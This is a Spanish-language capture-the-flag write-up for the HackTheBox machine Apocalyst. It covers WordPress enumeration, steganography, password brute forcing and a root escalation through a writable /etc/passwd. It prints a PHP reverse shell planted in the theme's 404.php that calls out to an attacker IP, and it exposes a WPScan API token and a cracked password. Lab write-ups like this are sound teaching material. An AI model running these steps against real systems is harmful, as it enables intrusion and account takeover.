------
- Tags: #virtualhosting #wfuzz #cewl #steghide #wpscan #searchsploit #template-abuse-for-RCE
----
# Resolución

## Reconocimiento

### OS

**LINUX**
```shell
ping -c 1 10.10.10.46
PING 10.10.10.46 (10.10.10.46) 56(84) bytes of data.
64 bytes from 10.10.10.46: icmp_seq=1 ttl=63 time=251 ms

--- 10.10.10.46 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 251.414/251.414/251.414/0.000 ms
```

### NMAP

**Puertos**
```js
# Nmap 7.94SVN scan initiated Wed Dec  4 15:09:19 2024 as: nmap -p- --open --min-rate 5000 -vvv -n -Pn -oN allPorts 10.10.10.46
Nmap scan report for 10.10.10.46
Host is up, received user-set (0.25s latency).
Scanned at 2024-12-04 15:09:19 -03 for 15s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Dec  4 15:09:34 2024 -- 1 IP address (1 host up) scanned in 15.06 seconds
```

**Servicios**
```js
# Nmap 7.94SVN scan initiated Wed Dec  4 15:13:02 2024 as: nmap -sCV -p22,80 -oN services 10.10.10.46
Nmap scan report for 10.10.10.46
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA)
|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA)
|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apocalypse Preparation Blog
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  4 15:13:21 2024 -- 1 IP address (1 host up) scanned in 19.02 seconds
```

-------
### Virtual Hosting

**Virtual Hosting** detectado para el servicio HTTP que corre por el *puerto 80* --> **``apocalyst.htb``**, por lo tanto se agregó al ``/etc/hosts``.

------
### Fuerza bruta con WFUZZ

Se realizó un ataque de **fuerza bruta** en búsqueda de directorios existentes a través del diccionario ``directory-list-2.3-medium``. Se encontró en varias rutas una imagen que se **repite** constantemente pero nada más de interés, no se descarta la posibilidad de análisis de imagen.

---

Se creo un **diccionario personalizado** empleando todas las palabras de la web con la herramienta **``cewl``** y se recurrió nuevamente a **``wfuzz``** con el mismo. Esta vez se filtró por los resultados con **157 caracteres** ya que se repetían constantemente.

- **``cewl -w diccionario.txt http://apocalyst.htb/``**
- **``wfuzz --hc=403,404 --hh=157 -c -t 20 -w diccionario.txt -u http://apocalyst.htb/FUZZ/``**

Gracias a este diccionario se detectó una ruta llamada **``Rightiousness``** que posee **más longitud** de caracteres, por lo tanto se descargó la imagen de la ruta y se procedió a su **análisis**.

![[Ap 1.png]]

------
### Análisis de imagen (Esteganografía)

Se utilizó la herramienta **``strings``** para ver caracteres legibles dentro de la imagen *``image.jpg``* pero no se encontró nada.
Se utilizó la herramienta **``exiftool``** para ver los metadatos de la imagen y no se encontró nada de interés.

Se utilizó la herramienta **``steghide``** para realizar una búsqueda de archivos ocultos dentro de la imagen y se encontró un archivo **``list.txt``**

- **``steghide info image.jpg``**

![[Ap 2.png]]

Procedemos a extraer dicho archivo con el siguiente comando.

- **``steghide extract -sf image.jpg``** --> El parámetro **``-sf``** viene de *``Source-File``*.

De esta forma tendríamos a disposición el archivo **``list.txt``** que por su contenido parece ser un **diccionario personalizado**.

### Fuerza bruta con WPSCAN

 Detectamos en el inicio del foro de http://apocalyst.htb que *``falaraki``* es un **usuario válido**, ya que el fue el que realizó uno de los posts, a su vez se verificó esto consultando en la ruta ``/wp-login.php`` que dicho usuario es válido.

![[Ap 3.png]]

También se verificó esto con un script localizado en **``searchsploit``** con el número *45939* que permite la **enumeración de usuarios válidos** a través del protocolo **SSH**.

- **``python2.7 userEnum-SSH.py 10.10.10.46 falaraki``**

![[Ap 4.png]]

Luego de obtener el usuario *``falaraki``* y el **diccionario** personalizado *``list.txt``* se realizó un ataque de fuerza bruta con **``wpscan``** hacia el usuario *``falaraki``*.

- **``wpscan --url http://apocalyst.htb -U falaraki -P list.txt --api-token="vOfyjyhFRl4j4OZa1GPqb2k8UECcA5cOseaCXL5sJDc"``**

![[Ap 5.png]]

Se detectó la contraseña para el usuario ``falaraki:Transclisiation``. Gracias a dicha contraseña conseguí acceder al **``wp-login.php``**.

----
## Explotación

### RCE a través de la modificación de Templates siendo usuario Administrador

![[Ap 6.png]]

Al eliminar todo el contenido del **``404.php``** colocaremos el siguiente código.

```php
<?php
	system("bash -c 'bash -i >& /dev/tcp/10.10.14.25/443 0>&1'");
?>
```

![[Ap 7.png]]

De esta forma al consultar a http://apocalyst.htb/?p=404.php automáticamente se enviará una **Reverse Shell** a nuestra máquina de atacante por el **puerto 443**.

![[Ap 8.png]]

De esta forma ganaríamos acceso a la máquina **Apocalyst**.

----
## Escalada de privilegios

Una vez accedemos a la máquina seremos el usuario ``www-data``, pero como este tendremos acceso al directorio personal de ``falaraki``, por lo tanto reclamamos la **flag** del usuario.

Luego procedemos con la escalada hacia el usuario privilegiado **``root``**.

-----

Realizando una búsqueda desde la raíz se detectó que en el archivo *``/etc/passwd``* poseemos permisos de escritura, por lo tanto lo que hacemos es **crear un Hash de contraseña** con el comando **``openssl``** y luego colocamos dicho Hash en la *``x``* de ``root:x:`` dentro del archivo **``/etc/passwd``**.

- **``openssl passwd``**

Luego proporcionamos cual queremos que sea la contraseña del **usuario** ``root``, en mi caso será **``root``**.

La herramienta me devolvió el Hash **``9Kjm.ADbY8tB.``** que equivale a "*root*", por lo tanto simplemente modificamos el ``/etc/passwd`` y en donde está la "``x``" en el usuario *``root``* colocamos el **Hash**. De esta manera simplemente quedaría autenticarnos con **``su root``** y proporcionando la contraseña ==NO HASHEADA== que en mi caso es *``root``*.

![[Ap 9.png]]

De esta forma habríamos conseguido el acceso total a la máquina **Apocalyst**.